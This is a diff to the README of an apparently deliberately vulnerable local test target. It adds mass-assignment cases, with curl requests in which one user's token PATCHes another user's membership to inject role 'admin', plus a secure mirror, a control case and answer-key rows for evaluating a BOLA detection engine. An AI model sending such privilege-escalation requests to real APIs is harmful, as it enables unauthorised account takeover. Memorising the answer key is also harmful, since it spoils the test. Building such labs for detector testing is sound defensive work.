@@ -92,6 +92,19 @@ state is read cross-path at `GET /api/relics|badges|seals/{id}` (id == owner id)
 | bob   | `relic_bob`   | `badge_bob` / `active`   | `seal_bob`   |
 | carol | `relic_carol` | `badge_carol` / `active` | `seal_carol` |
 
+Each user also owns one **membership** and one **subscription** (the M1.4 X-MASS cases). Both are
+written via `PATCH /api/users/{id}/membership|subscription` with **no GET on that path**; their
+state is read cross-path at `GET /api/memberships/{id}` / `GET /api/subscriptions/{id}`
+(id == owner id). **Carol's `role` is deliberately `NULL`**, and the state read *omits* a NULL
+`role` from the body — that models the common real-world case where the privileged field is
+**MISSING** rather than present, which is a legal original state (see X-MASS below):
+
+| user  | membership `plan` / `role` | subscription `plan` / `role` |
+|-------|----------------------------|------------------------------|
+| alice | `basic` / `member`         | `basic` / `member`           |
+| bob   | `basic` / `member`         | `basic` / `member`           |
+| carol | `basic` / *(NULL — omitted from the read)* | `basic` / *(NULL)* |
+
 The token maps 1:1 to a user, and the user carries a `role`, so the token
 transitively **encodes which user (and thus their role)** — no crypto, this is a
 target. Log in to retrieve a token (static, so this is mostly a formality):
@@ -587,6 +600,75 @@ case too (the object is still the victim's) — only the *negative assertion* se
 
 ---
 
+## M1.4 mass-assignment additions (X-MASS cases)
+
+Both PATCHes return a **byte-identical opaque `200 {"status":"ok"}`** and have **no same-path GET**.
+The attacker sneaks a **privileged, LOW-ENTROPY** field (`role: "admin"`) into a write on the
+victim's object. `/membership` binds every writable column (**no allow-list — that is the bug**);
+`/subscription` has an explicit allow-list and **strips `role`** while still accepting `plan`.
+
+Low entropy is what makes this shape hard: reading `role: "admin"` afterwards does **not** prove
+the attacker set it — it may always have been `admin`. Only a **JUMP from a known prior state**
+proves causality, which is why the pre-flight read is mandatory here.
+
+### X-MASS-VULN — REAL mass-assignment BOLA (membership)
+
+```bash
+# PRE-FLIGHT (the baseline): Bob's membership, role == "member"
+curl -s http://127.0.0.1:8001/api/memberships/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"plan":"basic","role":"member"}
+
+# Alice PATCHes Bob's membership with HER token, sneaking in `role`
+curl -s -X PATCH http://127.0.0.1:8001/api/users/2/membership \
+  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
+  -d '{"plan":"pro","role":"admin"}'
+# -> {"status":"ok"}        (opaque — identical to the SECURE mirror)
+
+# AFTER: BOTH sent fields jumped -> causality proven
+curl -s http://127.0.0.1:8001/api/memberships/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"plan":"pro","role":"admin"}
+```
+
+**The MISSING variant (hidden-field escalation).** Carol's `role` is NULL and omitted from the
+read, so the pre-flight body has **no `role` key at all**. That is a legal original state, and
+`missing → "admin"` is still a jump:
+
+```bash
+curl -s http://127.0.0.1:8001/api/memberships/3 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":3,"owner_id":3,"plan":"basic"}          (no "role" key — MISSING, not unknown)
+# ... PATCH /api/users/3/membership {"role":"admin"} ...
+# -> {"id":3,"owner_id":3,"plan":"basic","role":"admin"}
+```
+
+A pre-flight that **fails** (non-2xx, unreachable, unparseable JSON) is **UNKNOWN**, not MISSING —
+it can never confirm a jump, so it can never `verify`.
+
+### X-MASS-SAFE — SECURE mirror (subscription)
+
+```bash
+curl -s -X PATCH http://127.0.0.1:8001/api/users/2/subscription \
+  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
+  -d '{"plan":"pro","role":"admin"}'
+# -> {"status":"ok"}        (byte-identical to X-MASS-VULN)
+
+curl -s http://127.0.0.1:8001/api/subscriptions/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"plan":"pro","role":"member"}    # `role` STRIPPED; `plan` landed
+```
+
+**This case is why M1.2's channel had to be narrowed.** `plan` legitimately landed, so the
+*old* payload-causality gate saw the attacker's value present in the victim's object and would have
+called a **secure** endpoint `verified`. The state-jump gate requires **every** sent field to move;
+`role` did not, so there is no confirmed jump and no exemption. A `verified` here is a **false
+positive** — and one the engine actually would have produced before M1.4.
+
+### X-MASS-CONTROL — no jump (already that value)
+
+Sending `{"role":"member"}` to `/membership` (Bob's existing value) lands, but there is **no
+movement**, so causality is unproven and the verdict must not be `verified` — presence alone never
+confirms.
+
+---
+
 ## Planted-truth summary (ground truth / answer key)
 
 | case   | endpoint                              | planted truth          | how to confirm                                  |
@@ -609,6 +691,8 @@ case too (the object is still the victim's) — only the *negative assertion* se
 | X-DELETE-VULN-HARD | `DELETE /api/users/{id}/relic` | **REAL** (delete BOLA, physical) | pre-flight STATE exists → after: `GET /api/relics/{id}` 404s (no same-path GET) |
 | X-DELETE-VULN-SOFT | `DELETE /api/users/{id}/badge` | **REAL** (delete BOLA, logical/soft) | pre-flight STATE `status:"active"` → after: still 200 but `status:"revoked"` |
 | X-DELETE-SAFE | `DELETE /api/users/{id}/seal`  | **NOT vulnerable** (delete secured mirror) | pre-flight STATE exists → after: object STILL PRESENT, unchanged |
+| X-MASS-VULN | `PATCH /api/users/{id}/membership` | **REAL** (mass-assignment BOLA — no allow-list) | pre-flight STATE `role:"member"` (or `role` MISSING for carol) → after: **every sent field jumped** to the injected value |
+| X-MASS-SAFE | `PATCH /api/users/{id}/subscription` | **NOT vulnerable** (allow-list strips `role`) | pre-flight STATE → after: `plan` landed but `role` did **not** move — no full jump. ⚠️ presence-only causality would false-positive here |
 
 ---
 
